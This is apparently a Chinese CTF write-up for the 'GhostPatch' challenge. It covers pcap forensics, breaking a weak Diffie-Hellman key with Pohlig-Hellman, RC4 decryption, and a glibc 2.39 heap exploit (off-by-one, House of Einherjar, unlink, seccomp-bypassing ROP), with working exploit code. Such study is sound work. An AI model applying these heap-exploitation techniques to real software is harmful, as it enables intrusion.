# GhostPatch 复现文档

> **题目类型**：流量取证 + 协议逆向 + 密码学攻击 + 二进制 Pwn（堆）
> **目标服务**：`FGT/1.0` 网关（tcp/9999），背后为补丁暂存守护进程 `patchd 2.4.1-debug` 的维护控制台
> **附件**：`ghostpatch_59b347d7ba71f9e26493a87161f9baf6.zip` → `capture.pcap`（2.6 MB）
> **动态靶机**：`nc 60.205.176.201 22784`（该网关服务复刻）
> **结果**：`flag{23765d2c-2f6a-468a-86e4-b1a0d167bb7b}`

---

## 0. TL;DR

题目给了一段镜像口抓包，并说明"网关上的 FGT/1.0 服务（tcp/9999）背后是补丁暂存守护进程的维护控制台；调试版二进制没有入库，只在那次会话里出现过"。

解链如下：

```
pcap ──[FGT/0.9 明文通道泄漏协议]──► 识别 FGT/1.0 帧格式
     ──[DH 弱模数 p-1 光滑 → Pohlig-Hellman]──► 恢复会话密钥
     ──[RC4 逐方向解流]──► 提取 patchd 2.4.1-debug + libc 2.39 + ld
                                              │
fw_v2.bin ──[逆向 menu/hotfix]──► off-by-one NUL 越界写
         ──[House of Einherjar #1]──► libc 基址
         ──[House of Einherjar #2 + unlink]──► blobs 数组任意改写 → 任意读写
         ──[environ → 栈 → main 返回地址]──► ROP
         ──[seccomp 只放行 openat/read/write]──► 读 /flag
```

本次复现未在本地起服务，直接对**动态靶机**开发并两轮独立会话验证通过，得到实例 flag：

```
flag{23765d2c-2f6a-468a-86e4-b1a0d167bb7b}
```

> 说明：网上流传的 WRITEUP 中 flag 为 `flag{a0278fc5-...}`，那是**另一实例**的 flag；本靶机为独立实例，flag 不同但利用链完全一致。

---

## 1. 阶段一：抓包分析与加密信道还原

### 1.1 流量总览

```bash
$ tshark -r capture.pcap -q -z conv,tcp
192.168.16.128:46124  <-> 192.168.16.9:9999    1751/2501 kB   1752/94 kB   ← 加密信道（主体）
192.168.16.128:46018  <-> 192.168.16.9:8888      20/10 kB      22/10 kB    ← 遗留明文通道
192.168.16.128:45812  <-> 192.168.16.9:80         4/1566 B      6/440 B    ← ops wiki
```

三股流里，`80` 是 `GET /ops/patch-policy.html`，其中直接给出了关键业务背景：

```
STAGING WORKFLOW (patchd 2.4.1)
  stage    - upload a patch blob; buffers are calloc'd so no residue
  verify   - dump the staged blob bytes for peer review
  hotfix   - small in-place corrections before dispatch; the daemon
             NUL-terminates the edited range for the review tooling
  rollback - drop a staged blob
  dispatch - commit the staging set

  every daemon prints its build id and staging-table address in the
  self-test blob (slot 0) for asset tracking. verify slot 0 first
  when attaching a debugger.

TRANSPORT
  production channel . . . FGT/1.0 on tcp/9999 (encrypted)
  legacy channel  . . . . FGT/0.9 on tcp/8888 (deprecated, cleartext)
```

> 这里已经埋了两个坑点提示：`hotfix` 会对编辑区间做 **NUL 终止**（越界隐患），`slot 0` 会泄漏 **build id + staging-table 地址**（信息泄漏）。

### 1.2 明文通道（8888）直接泄漏了会话层协议

`follow tcp stream` 那个 8888 连接，服务端先发 `FGT/0.9 OK -`，然后传了一个 `notice.txt`，正文里把 FGT/1.0 的会话层写了个明白：

```
FGT/1.0 (port 9999) works exactly like this channel except for the session layer:

  * handshake: the server announces the dev modulus p and generator g;
    client sends HELLO with A = g^a mod p, server replies OK with
    B = g^b mod p; shared = B^a = A^b mod p
  * session key K = SHA-256(shared)[:16]
  * RC4 with K, one independent stream per direction
  * frame wire format: [u16be length][rc4(frame)]

  frame types (payload after the u8 type):
    01 GET   [u16 namelen][name]
    02 META  [u64be size][32B sha256][u16 namelen][name]
    03 DATA  [u32be seq][u32be len][bytes]
    04 END   [32B sha256]
    05 ERR   [u8 code]
    06 LIST  [u16 count]{[u16 namelen][name]}
    07 SHELL            enter maintenance console
    08 OKSH
    09 CIN   [u32be len][bytes]   console stdin
    0A COUT  [u32be len][bytes]   console stdout

Files are chunked at 0x400 bytes per DATA frame. The v2 debug daemon
(patchd 2.4.1) is reachable through the SHELL frame on the encrypted
listener.
```

一句话总结：**length 字段是明文，只有 frame（含 u8 type）参与 RC4；每个方向一条独立连续的 RC4 流（不按帧重置）。**

### 1.3 拿到 9999 的握手参数

```bash
$ tshark -r capture.pcap -z follow,tcp,raw,2 -q | head -8
	4647542f312e3020524541445920703d38333438643431613732323520673d350a
4647542f312e302048454c4c4f203337303961316435326431640a
	4647542f312e30204f4b20643930363733633236620a
00017a000cd9d9295629f82be30fe25875000f0b08...
```

解码后可读部分：

```
server → client : FGT/1.0 READY p=8348d41a7225 g=5\n
client → server : FGT/1.0 HELLO 3709a1d52d1d\n
server → client : FGT/1.0 OK d90673c26b\n
```

即

| 符号 | 值 |
|---|---|
| p | `0x8348d41a7225` = 144348819386917（48 bit） |
| g | `5` |
| A = g^a | `0x3709a1d52d1d` |
| B = g^b | `0xd90673c26b` |

### 1.4 密码学攻击：`p-1` 光滑 → Pohlig-Hellman

48 bit 的模数本身就对 BSGS 不友好，而题目自己写了 **"dev modulus"**。先试分解：

$$p-1 = 144348819386916 = 2^2 \cdot 3 \cdot 41 \cdot 71 \cdot 73 \cdot 79 \cdot 83 \cdot 89 \cdot 97$$

**最大素因子只有 97**，于是 Pohlig-Hellman 可以在"几个微秒"内求出离散对数：

```python
P   = 0x8348d41a7225
G   = 5
A   = 0x3709a1d52d1d
B   = 0xd90673c26b
FAC = [(2,2),(3,1),(41,1),(71,1),(73,1),(79,1),(83,1),(89,1),(97,1)]

def dlog_ph(g, h, p, fac):
    """Pohlig-Hellman：逐素因子幂求解子群离散对数，再 CRT 合并"""
    residues, mods = [], []
    for q, e in fac:
        qe    = q ** e
        gamma = pow(g, (p - 1) // qe, p)     # 阶为 qe 的子群生成元
        hh    = pow(h, (p - 1) // qe, p)     # 把 h 投影到该子群
        cur, x = 1, None
        for i in range(qe):                  # 子群阶 ≤ 97，直接暴力
            if cur == hh:
                x = i; break
            cur = cur * gamma % p
        residues.append(x); mods.append(qe)
    x, M = 0, 1
    for r, m in zip(residues, mods):         # CRT
        x += M * (((r - x) * pow(M, -1, m)) % m)
        M *= m
    return x

a = dlog_ph(G, A, P, FAC)      # a = 8357903120266
shared = pow(B, a, P)          # = pow(A, b, P) = 129261817995543 = 0x75901cbea117
```

**会话密钥的序列化方式**必须试：`shared` 是 48 bit → 服务端用 **固定 6 字节大端**：

```python
K = hashlib.sha256(shared.to_bytes(6, 'big')).digest()[:16]
# K = b7 5a d0 15 fa 64 36 b6 dd 64 79 dc b9 c6 60 b4
```

> **验证方式**：解密 s2c 的第一帧，长度字段应合理且 `type ∈ {01..0A}`。若用 `str(shared)` / `hex(shared)` / `to_bytes(8,'big')` 等错误序列化，首字节会落在 0x2x/0x3x 之类的非法 type 上。

### 1.5 解帧与文件提取

RC4 状态在**每方向内连续**，且 **length 字段明文不参与加解密**：

```python
class RC4:
    def __init__(self, key):
        S = list(range(256)); j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) & 0xff
            S[i], S[j] = S[j], S[i]
        self.S, self.i, self.j = S, 0, 0
    def crypt(self, data):
        S, i, j = self.S, self.i, self.j
        out = bytearray(len(data))
        for k, c in enumerate(data):
            i = (i + 1) & 0xff
            j = (j + S[i]) & 0xff
            S[i], S[j] = S[j], S[i]
            out[k] = c ^ S[(S[i] + S[j]) & 0xff]
        self.S, self.i, self.j = S, i, j
        return bytes(out)

def parse(stream, key):
    rc, pos, frames = RC4(key), 0, []
    while pos + 2 <= len(stream):
        ln = int.from_bytes(stream[pos:pos+2], 'big'); pos += 2   # 明文长度
        if ln == 0 or pos + ln > len(stream): break
        frames.append(rc.crypt(stream[pos:pos+ln])); pos += ln   # 连续 RC4
    return frames
```

按 `02 META / 03 DATA / 04 END` 拼装并校验 `sha256`，**5 个文件全部通过完整性校验**：

| 文件 | 大小 | sha256 前 8 字节 |
|---|---|---|
| `notes.txt` | 1312 | `d2e5441746107d0f` |
| `checksum.txt` | 391 | `e0379540824fb751` |
| **`fw_v2.bin`** | **16520** | `0f9b3ce7363a988f` |
| `libc.so.6` | 2125328 | `8db37cf3f2169f59` |
| `ld-linux-x86-64.so.2` | 236616 | `cd4df4f3c7b83673` |

提取文件的 sha256（本次复现实测）：

```
9feb3bd134fa5a0dbc290132c0731d17e8768469a535f82673077f1e215f5be0  fw_v2.bin
```

`notes.txt` 把故事补全了：

```
2025-06-03  nightshift
  rolled patchd 2.4.1-debug onto the gateway ... binaries were shipped through
  this session; if they are needed again, recover them from the span capture
  (case #4711) ...

2025-06-05  auditor
  follow-up on ticket 2025-0601-02: the off-by-one in the v1 hotfix
  path was in the OLD daemon (1.x line, long retired). v2 staging
  code was reviewed — staging buffers are calloc'd and wiped, no
  residue. closing the ticket.
```

> 「审计认为 v2 没问题」——典型 CTF 反向暗示：**v2 里 off-by-one 依然存在**。

s2c 尾部的控制台交互也一并解密出来（`07 SHELL` → `08 OKSH` → `0A COUT`）：

```
GhostPatch daemon 2.4.1-debug (staging mode)

[GhostPatch 2.4.1-debug]
 1) stage    - stage a patch blob
 2) verify   - dump blob bytes for review
 3) hotfix   - patch blob in place
 4) rollback - drop a staged blob
 5) dispatch - commit staged patches and exit
>
```

---

## 2. 阶段二：patchd 2.4.1-debug 逆向

### 2.1 基础信息

```bash
$ file fw_v2.bin
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
BuildID[sha1]=e063ee573f837105de6a59471f97606ea83a97d4

$ checksec --file=fw_v2.bin
RELRO: Full RELRO   Stack: Canary found   NX: NX enabled   PIE: PIE enabled
FORTIFY: Enabled    SHSTK: Enabled        IBT: Enabled     Stripped: No
```

符号表极其干净：

```
0000000000001180 T main
0000000000001520 t menu
0000000000001420 t readn
0000000000001470 t getnum
0000000000004140 b blobs        ← 全局指针
0000000000004040 b tag_buf      ← 256 字节静态 buffer
```

（本次复现用 pwntools 核对符号，全部与上表一致。）

### 2.2 数据结构

`main`（0x1180）开头：

```asm
; calloc(7, 0x10) —— 7 个槽，每槽 16 字节
mov  esi,0x10
mov  edi,0x7
call calloc@plt
mov  QWORD PTR [rip+0x2f84],rax      ; blobs = rax    ← blobs 是「指针」
; calloc(1, 0x88) —— slot0 的 self-test blob
mov  esi,0x88
mov  edi,0x1
call calloc@plt
mov  QWORD PTR [rbx],0x88            ; blobs[0].size = 0x88
mov  QWORD PTR [rbx+0x8],rax         ; blobs[0].data = ptr
; snprintf(slot0, 0x88, fmt, menu, blobs, 7)
```

于是得到 **`blobs` 的实际数据结构**（位于堆上，不是 .bss）：

```c
struct blob { uint64_t size; void *data; };
struct blob *blobs = calloc(7, sizeof(struct blob));   // 7 槽

blobs[0].size = 0x88;                                   // self-test blob
blobs[0].data = calloc(1, 0x88);
snprintf(blobs[0].data, 0x88,
         "GhostPatch 2.4.1-debug selftest ok\nbuild=%p table=%p slots=%d\n",
         &menu, blobs, 7);
```

格式化字符串本身就在 `.rodata`（0x20e8）：

```
"GhostPatch 2.4.1-debug selftest ok\nbuild=%p table=%p slots=%d\n"
```

**这就是预告过的「slot 0 泄漏 build id + staging-table 地址」**：
`verify(0)` 会直接吐出 **PIE 基址**（`&menu - 0x1520`）和 **堆地址**（`blobs` 数组）。

### 2.3 五个菜单动作（本次复现按反汇编逐条核对）

| # | 动作 | 位置 | 关键行为 |
|---|---|---|---|
| 1 | stage | 0x17A0 | `size ∈ [0x88, 0x418]` → `p = calloc(1, size)`；写入第一个 `data == 0` 的空槽；`readn(p, size)` |
| 2 | verify | 0x1740 | `write(1, blobs[slot].data, blobs[slot].size)` |
| 3 | hotfix | 0x1668 | **漏洞点**（见下） |
| 4 | rollback | 0x1608 | `free(blobs[slot].data); blobs[slot].data = 0` |
| 5 | dispatch | 0x17E8 | 读 operator tag 到 `tag_buf`，然后 `menu()` 返回 → `main` 返回 |

子提示（来自 `.rodata`）：

```
size: / data: / slot: / offset: / length: / operator tag:
[+] slot / [+] verify done / [+] hotfix applied / [+] rolled back
[-] bad size / [-] alloc failed / [-] no such blob / [-] bad offset / [-] bad length
```

`getnum` 逐字符读到 `\n`，再用 `strtol(buf, NULL, 10)` 解析——即控制台是**行式十进制输入**；`readn` 则严格读满 N 字节原始数据。

### 2.4 漏洞：hotfix 的 off-by-one NUL 写

```asm
1668: lea  rdi, "slot: ";   call getnum      ; rax = slot
1674: cmp  rax, 0x6;        ja   <err>
167e: shl  rax, 4
1685: mov  rbx, [rip+blobs]                  ; rbx = blobs + slot*16
168c: cmp  [rax+rbx+8], 0;  je   <err>       ; data 必须非空
1698: lea  rdi, "offset: "; call getnum      ; r15 = off
16a4: lea  rdi, "length: "; call getnum      ; rcx = len
16b6: mov  rax, [rbx]                        ; rax = size
16c1: cmp  rax, r15;        jb   <bad_off>   ; if (size < off) err
16ca: sub  rax, r15
16cd: cmp  rax, rcx;        jb   <bad_len>   ; if (size - off < len) err
16d6: lea  rsi, "data: ";   write
16f0: mov  rdi, [rbx+8];    add rdi, r15     ; data + off
1703: call readn                            ; readn(data+off, len)
1710: mov  rax, [rip+blobs]
1717: mov  rcx, [rsp]
171b: add  r15, [rax+rbx+8]                  ; data + off
1731: mov  BYTE PTR [r15+rcx*1], 0x0         ; ★ data[off + len] = 0
```

C 伪代码：

```c
void hotfix(int slot, size_t off, size_t len) {
    if (slot > 6) return;
    if (!blobs[slot].data) return;
    if (blobs[slot].size < off) return;             // off <= size
    if (blobs[slot].size - off < len) return;       // len <= size - off
    readn(blobs[slot].data + off, len);
    blobs[slot].data[off + len] = '\0';             // ← off+len == size 时越界 1 字节
}
```

**只要 `off + len == size`，就会在 `data[size]` 写一个 NUL。**

关键在于这个越界字节落在哪里 —— 取决于 `size` 是否 16 字节对齐：

```
chunk_size = align(size + 8, 16)
data[size] = chunk + 0x10 + size

size ≡ 8 (mod 16)  →  data[size] = next_chunk + 8   →  命中【下一个 chunk 的 size 字段最低字节】
size ≡ 0 (mod 16)  →  data[size] = next_chunk + 0   →  命中【下一个 chunk 的 prev_size 字段最低字节】
```

即经典的 **poison null byte**：把下一个 chunk 的 `size` 从 `0x?01` 清成 `0x?00`，**同时清除 `PREV_INUSE` 位**。

### 2.5 seccomp：白名单只有 7 个 syscall

`main` 在打印 banner 前装了一个 `SECCOMP_MODE_FILTER`（13 条 classic BPF），重新解析后**允许的 syscall**：

| syscall | nr |
|---|---|
| `read` | 0 |
| `write` | 1 |
| `close` | 3 |
| `brk` | 12 |
| `exit` | 60 |
| `exit_group` | 231 |
| `openat` | 257 |

其余一律 `SECCOMP_RET_KILL_PROCESS`。

> **战术含义**：`execve`/`mmap`/`mprotect`/`madvise`/`futex` 全灭 ——
> ① 不能 getshell，只能 **openat+read+write 读文件**；
> ② `madvise`/`mmap` 被禁意味着 glibc 的某些路径会以 **SIGSYS** 而不是正常的 `malloc_printerr` 失败（调试时会坑到）。
>
> 顺带说明：这个过滤器也解释了为什么 `calloc` 全程不得不用 `brk` 扩展堆 —— `stage` 最大只到 `0x418`，永远走不到 `mmap` 阈值。

---

## 3. 阶段三：堆利用

### 3.1 堆布局基线

`table` = `blobs` 数组的 `data` 地址（由 `verify(0)` 泄漏）。实测（本地 / 远程一致）：

```
heap+0x000  ┌───────────────────────────┐
            │ tcache_perthread_struct   │  size 0x290
heap+0x290  ├───────────────────────────┤
            │ blobs[7]                  │  size 0x80   data = heap+0x2a0 = table
heap+0x310  ├───────────────────────────┤
            │ slot0 self-test blob      │  size 0x90   data = heap+0x320
heap+0x3a0  ├───────────────────────────┤
            │ top                       │
            └───────────────────────────┘
```

于是 `top` 起始 = `table + 0x100`，这是后面所有地址推算的基准。

### 3.2 泄露 PIE / heap

```
verify(0) → b"GhostPatch 2.4.1-debug selftest ok\nbuild=0x7f...9520 table=0x5555...b2a0 slots=7\n"
             │                                        │
             └─ PIE base = build - 0x1520             └─ table (heap)
```

本次复现实测两轮：

```
[+] pie = 0x7f37b630d000   table = 0x5555566e02a0
[+] pie = 0x7fab69079000   table = 0x5555568482a0
```

### 3.3 填满 `tcache[46]`

目的：让后续 `free` 一个 `0x300` 的 chunk 时**绕过 tcache**，从而进入真正的合并路径。

```python
x.rollback(0)                            # 释放 self-test blob(0x90) 腾出 slot0
for i in range(7):
    x.stage(0x2F8, bytes([0x41+i])*0x2F8)  # 7 × chunk 0x300 @ table+0x100 + i*0x300
for i in range(6, -1, -1):
    x.rollback(i)                        # 逆序 free → tcache[46] count = 7 (满)
```

此时 `top = table + 0x100 + 7*0x300 = table + 0x1600`。

> ⚠️ 一个**必须**先踩的坑：`stage` 用的是 `calloc`，而 glibc 的
> `__libc_calloc()` **只调用 `_int_malloc()`，压根不检查 tcache**
> （tcache 只在 `__libc_malloc()` 里被查）。
> 所以 tcache 里的 chunk **永远不会被 `stage` 复用** ——
> 既让「填满 tcache」成为可能，也顺手判了 **tcache poisoning 的死刑**。

### 3.4 House of Einherjar #1 → libc 基址

分配三个 blob（全部从 top 顺序切出）：

```
A = stage(0xF8)  → chunk 0x100 @ A_chunk = table+0x1600   (slot0)
B = stage(0x308) → chunk 0x310 @ B_chunk = A_chunk+0x100  (slot1)
C = stage(0x108) → chunk 0x110 @ table+0x1A10             (slot2，隔离 top)
```

**关键的取巧点：把 fake chunk 直接放在「A 自己的 chunk 头」上。**

`A_chunk` 的 `size` 字段天然是 `0x101`（`chunksize = 0x100`），**不需要我们伪造**，只需要让 `B.prev_size` 指向 `A_chunk` 即可：

```
A_chunk (table+0x1600)                      B_chunk (table+0x1700)
┌──────────────────┬──────────────────┐    ┌──────────────────┬──────────────────┐
│ prev_size        │ size = 0x101     │    │ prev_size=0x100  │ size = 0x311     │
└──────────────────┴──────────────────┘    └──────────────────┴──────────────────┘
      ▲  同时也被当作 fake chunk 的头部             ▲
      │                                              │
   fd/bk = A_chunk（自引用）                     被 off-by-one 清零 → 0x300
```

A 的 payload（`0xF8` 字节，正好写满 user 区）：

```python
A_chunk = table + 0x1600
payload = bytearray(0xF8)
payload[0:8]   = p64(A_chunk)   # fake.fd = A_chunk
payload[8:16]  = p64(A_chunk)   # fake.bk = A_chunk
payload[0xF0:0xF8] = p64(0x100) # B.prev_size = chunksize(fake)
x.stage(0xF8, bytes(payload))
```

B 的 payload 里 `B.data[0x2F8:0x300] = p64(0x11)` 用来伪造 `nextchunk->size`（见 3.6 的踩坑）。

然后：

```python
x.hotfix(0, 0xF8, 0)     # off=0xF8, len=0 → 写 A.data[0xF8] = 0
                         # A.data[0xF8] = A_chunk+0x108 = B_chunk+8 = B.size 低字节
x.rollback(1)            # free(B)
```

`free(B)` 在 glibc 2.39 `_int_free` 中的完整判定（**已用反汇编逐条核对**）：

```
size = chunksize(B) = 0x300
  ├─ tcache?  tc_idx=46, counts[46]==7 → 不走 tcache            ✔ 继续
  ├─ fastbin? 0x300 > 0x80                                      ✔ 跳过
  ├─ p == av->top?                                             ✘
  ├─ nextchunk = B_chunk + 0x300                                
  │    ├─ !prev_inuse(nextchunk) → *(B+0x308) & 1 == 1          ✔（我们伪造的 0x11）
  │    └─ nextsize = 0x11 & ~7 = 0x10 : >0x10 且 < system_mem   ✔
  └─ !prev_inuse(B)  (bit0 已被清)                              → 进入合并
        prevsize = B.prev_size = 0x100
        p = B_chunk - 0x100 = A_chunk
        chunksize(A_chunk) == 0x100 == prevsize                 ✔
        unlink_chunk(A_chunk):
            chunksize(p) == prev_size(next_chunk(p)) = 0x100    ✔
            fd = A.data[0x00:0x08] = A_chunk
            bk = A.data[0x08:0x10] = A_chunk
            fd->bk == p && bk->fd == p                          ✔（自引用）
      → 合并 size = 0x100 + 0x300 = 0x400，chunk 起始 = A_chunk
      → 放入 unsorted bin
      → 写 p->fd = p->bk = unsorted_chunks(av) = main_arena + 0x60
        即 A_chunk+0x10 = A.data[0:16]
```

于是：

```python
libc = u64(x.verify(0)[0:8]) - (0x203ac0 + 0x60)      # main_arena + 0x60
```

本回复现实测泄漏（两轮）：

```
[+] libc = 0x7f37b6000000  (leak fd = 0x7f37b6203b20)
[+] libc = 0x7fab68e00000  (leak fd = 0x7fab69003b20)
```

`verify(0)` 读到的 `A.data` 现在是：

```
0000000000000000  f103000000000000  202b31dec17f0000  202b31dec17f0000
   prev_size           size=0x3F1        fd=main_arena+0x60  bk=main_arena+0x60
```

**libc 到手。**

> 本次复现已从提供的 `libc.so.6` 反汇编 `__libc_malloc` 核对：
> `lea rcx,[rip+0x1562a1]`（0xad818）算得 **main_arena = 0x203ac0**，故 `unsorted_chunks = 0x203b20`，与脚本一致。

### 3.5 为第二次合并铺路

```python
x.stage(0x3F8, b'D'*0x3F8)   # 取走 unsorted bin 里的 0x400 chunk（slot1），清空 unsorted
x.rollback(0)                # free(A1.data) → A_chunk 的 size 已是 0x401 → 整块 0x400 进 tcache[62]
```

注意 `free(A1)` 释放的是 **`A_chunk`（size 0x401 → chunksize 0x400）**，因为第一次合并已经把 `A_chunk` 的 size 字段改成了 `0x401`。

### 3.6 踩坑记录：`free(): invalid next size (normal)`

第一次跑的时候 `free(B)` 直接 abort。为了看到真正的报错，需要先把二进制里的 seccomp 关掉，否则 `__libc_message()` 里的某个 syscall 会被 `SECCOMP_RET_KILL_PROCESS` 干掉，只剩一个 SIGSYS：

```python
data = bytearray(open('fw_v2.bin','rb').read())
data[0x12e3:0x12e8] = b'\x90'*5      # call prctl  →  NOP ×5
open('fw_v2_nosec.bin','wb').write(data)
```

关掉后立刻看到 `free(): invalid next size (normal)`。反汇编 libc 定位到检查点：

```
ab0b8:  cmp    $0x10,%rax              ; rax = nextchunk->mchunk_size（原始值）
ab0bc:  jbe    ab1a8                   ; <= 0x10  → invalid next size
ab0c2:  cmp    0x888(%r15),%r14        ; r14 = nextsize，0x888 = av->system_mem
ab0c9:  jae    ab1a8                   ; >= system_mem → invalid next size
```

**修正：伪造 `nextchunk->size` 时必须把 8 字节整体写小值。**

```python
b1[0x2F8:0x300] = p64(0x11)      # ✔ 0x11 > 0x10 且 nextsize = 0x10 < system_mem
# b1[0x2F8] = 0x11              # ✘ 高字节残留 'B' → nextsize 巨大 → abort
```

顺带一提，把 `0x11` 设计成 `chunksize = 0x10` 也不是随便挑的：`nextchunk + 0x10 = B_chunk + 0x310 = C_chunk`，于是后面那句
`inuse_bit_at_offset(nextchunk, nextsize)` 恰好读到 **C 的真实 size 字段**，`nextinuse = 1`，走 `clear_inuse_bit_at_offset` 而不是误 unlink C。

### 3.7 House of Einherjar #2：unlink 任意写

第二次改成 **利用 unlink 本身做任意写**：

先释放 `A1` 后 `slot0` 空出，重新分配：

```python
fd = table - 0x10          # → fd->bk = *(table-0x10+0x18) = *(table+8) = blobs[0].data
bk = table - 8             # → bk->fd = *(table-8+0x10)  = *(table+8) = blobs[0].data

payload2 = bytearray(0xF8)
payload2[8:16]      = p64(0xF0)     # fake.size（= B2.prev_size）
payload2[0x10:0x18] = p64(fd)       # fake.fd
payload2[0x18:0x20] = p64(bk)       # fake.bk
payload2[0xF0:0xF8] = p64(0xF0)     # B2.prev_size
x.stage(0xF8, bytes(payload2))      # slot0 = A2，fake chunk 放在 A2.data
...
x.hotfix(0, 0xF8, 0)
x.rollback(3)                       # free(B2) → merge → unlink(fake)
```

**unlink 检查为什么能过**（fake chunk `p = A2.data`，而 `stage` 刚把 `blobs[0].data` 设成了 `A2.data`）：

```
fd->bk == p  ⇔  *(table+8) == A2.data  ⇔  blobs[0].data == A2.data   ✔
bk->fd == p  ⇔  *(table+8) == A2.data                                ✔
```

**unlink 的两条写**：

```
*(fd + 0x18) = bk   →  *(table+8) = table-8
*(bk + 0x10) = fd   →  *(table+8) = table-0x10      ← 最终结果
```

于是 `blobs[0].data = table - 0x10`（指向 blobs 数组前 0x10 字节）。本次复现实测 `blobs` 数组头部：

```
f800000000000000 90026e5655550000 3000000000000000 a0026e5655550000 0800000000000000 0000000000000000
 size=0xF8       data=table-0x10    size=0x30        data=table-0x20     ...
```

### 3.8 任意读写原语

现在 `blobs[0] = {size=0xF8, data=table-0x10}`，所以：

```python
x.hotfix(0, off=0x10, len=0xE8, payload)   # 写 (table-0x10)+0x10 = table 起 0xE8 字节
                                           # ⇒ 直接改写整个 blobs 数组（及之后）
```

`blobs` 数组 7 项共 `0x70` 字节，`0xE8` 足够覆盖。于是：

| 目标 | 做法 |
|---|---|
| **任意读** | 设 `blobs[1] = {size=N, data=addr}` → `verify(1)` 读 `N` 字节 |
| **任意写** | 设 `blobs[2] = {size=N, data=addr}` → `hotfix(2, 0, N, data)` |

```python
def set_blobs(b1_size, b1_data, b2_size=8, b2_data=0):
    arr = bytearray(0xE8)
    arr[0:8]   = p64(0xF8);          arr[8:16]  = p64(table-0x10)   # 保持 slot0 自身
    arr[16:24] = p64(b1_size);       arr[24:32] = p64(b1_data)      # slot1: 读
    arr[32:40] = p64(b2_size);       arr[40:48] = p64(b2_data)      # slot2: 写
    x.hotfix(0, 0x10, 0xE8, bytes(arr))

def read_any(addr, n):
    set_blobs(n, addr)
    return x.verify(1)
```

> ⚠️ `hotfix` 末尾一定会写一个 NUL，因此**写目标地址时要留意末字节被清零**；本例写入 ROP 链时刚好落在 `0x180` 之后的填充区，无影响。

### 3.9 栈地址与 main 返回地址

```python
env   = libc + 0x20ad58                       # environ（libc dynsym 可查）
stack = u64(read_any(env, 8)[0:8])            # environ 的值 = 指向 envp[0] 的栈指针

data = read_any(stack - 0x400, 0x600)         # 朝低地址 dump 一段栈
R = None
for off in range(0, 0x600, 8):
    if u64(data[off:off+8]) == libc + 0x2a1ca:   # ★ main 的返回地址
        R = stack - 0x400 + off
        break
```

`libc + 0x2a1ca` 这个值不是猜的 —— 在 `__libc_start_call_main`（libc 0x2a150）里：

```asm
2a1c4:  mov    -0x78(%rbp),%rax
2a1c8:  call   *%rax                  ; ← call main
2a1ca:  mov    %eax,%edi              ; ★ main 的返回地址就在这里
2a1cc:  call   exit@plt
```

本次复现实测 `environ` 与 `main ret`：

```
[+] environ -> stack = 0x7ffe31400838
[+] main ret @ 0x7ffe31400708
```

（注意到 `R = environ - 0x130`，但代码用**搜索**而不是硬编码偏移，跨环境更稳。）

### 3.10 ROP：绕开 seccomp 只读文件

白名单里没有 `pop rdx; ret`（ROPgadget 全量扫描确认），需绕行。所有 gadget 均从提供的 `libc.so.6` 实测确认：

| 用途 | gadget | 偏移 |
|---|---|---|
| rdi | `pop rdi ; ret` | `0x10c08d` |
| rsi | `pop rsi ; ret` | `0x110b7d` |
| **rdx** | `pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret` | `0xb513c` |
| rax | `pop rax ; ret` | `0xdd337` |
| rcx | `pop rcx ; ret` | `0xa885e` |
| **fd 传递** | `mov edi, eax ; or edi, ecx ; mov rax, rdi ; ret` | `0x46488` |
| syscall | `syscall ; ret` | `0x99096` |

其它 libc 偏移：

| 名称 | 偏移 |
|---|---|
| `main_arena` | `0x203ac0` |
| `unsorted_chunks` = `main_arena+0x60` | `0x203b20` |
| `environ` | `0x20ad58` |
| `__libc_start_main` | `0x2a200` |
| `__libc_start_call_main`（`call main` 后） | `0x2a1ca` |

ROP 链：

```python
def rdx(v):
    return p64(libc+G_POP_RDX) + p64(v) + p64(0)*4

rop  = p64(libc+G_POP_RDI) + p64(0xffffffffffffff9c)   # AT_FDCWD = -100
rop += p64(libc+G_POP_RSI) + p64(flag_addr)
rop += rdx(0)                                          # O_RDONLY
rop += p64(libc+G_POP_RAX) + p64(257)                  # openat
rop += p64(libc+G_SYSCALL)

rop += p64(libc+G_POP_RCX) + p64(0)
rop += p64(libc+G_MOV_EDI_EAX)                         # rdi = fd
rop += p64(libc+G_POP_RSI) + p64(buf_addr)
rop += rdx(0x100)
rop += p64(libc+G_POP_RAX) + p64(0)                    # read
rop += p64(libc+G_SYSCALL)

rop += p64(libc+G_POP_RDI) + p64(1)
rop += p64(libc+G_POP_RSI) + p64(buf_addr)
rop += rdx(0x100)
rop += p64(libc+G_POP_RAX) + p64(1)                    # write
rop += p64(libc+G_SYSCALL)
```

栈上布局（`R` = main 返回地址）：

```
R + 0x000  ┌──────────────────────────────┐
           │ ROP 链（0x140 字节）          │
R + 0x180  ├──────────────────────────────┤
           │ "/flag\0"                    │
R + 0x1A0  ├──────────────────────────────┤
           │ buf（0x100 字节，read 目标）   │
           └──────────────────────────────┘
```

写入并触发：

```python
total = rop + b'\x00'*(0x180 - len(rop)) + flag_path + b'\x00'
set_blobs(0, 0, 0x400, R)          # blobs[2] = {size=0x400, data=R}
x.hotfix(2, 0, len(total), total)  # 把整条链拍进栈
x.menu(); x.io.sendline(b'5')      # dispatch → menu() 返回 → main() 返回 → ROP
x.io.recvuntil(b'tag: '); x.io.sendline(b'x')
```

> **踩坑**：写填充时一开始写成 `p64(0) * (0x180 - len(rop))`，
> 这是 `512` 字节而不是 `64` 字节，导致 `"/flag"` 字符串实际落在 `R+0x340`，
> 而 ROP 里引用的却是 `R+0x180` —— `openat` 拿到的是一个空串。
> 正确写法是 `b'\x00'*(0x180 - len(rop))`。

### 3.11 结果

```
[+] pie = 0x7f37b630d000   table = 0x5555566e02a0
[+] libc = 0x7f37b6000000  (leak fd = 0x7f37b6203b20)
[+] unlink done; blobs[0].data should be 0x5555566e0290
[+] environ -> stack = 0x7ffe31400838
[+] main ret @ 0x7ffe31400708
[*] rop len=320 total=390
[+] ROP installed
=== OUTPUT ===
b'[+] dispatch queued, bye\nflag{23765d2c-2f6a-468a-86e4-b1a0d167bb7b}\n...'
[+] FLAG: flag{23765d2c-2f6a-468a-86e4-b1a0d167bb7b}
```

两轮独立会话（ASLR 不同）均得同一 flag，确认为实例级静态 flag：

```
flag{23765d2c-2f6a-468a-86e4-b1a0d167bb7b}
```

---

## 4. 完整利用脚本

本次复现的脚本位于 `C:\Users\81913\Desktop\ghost_exp\`：

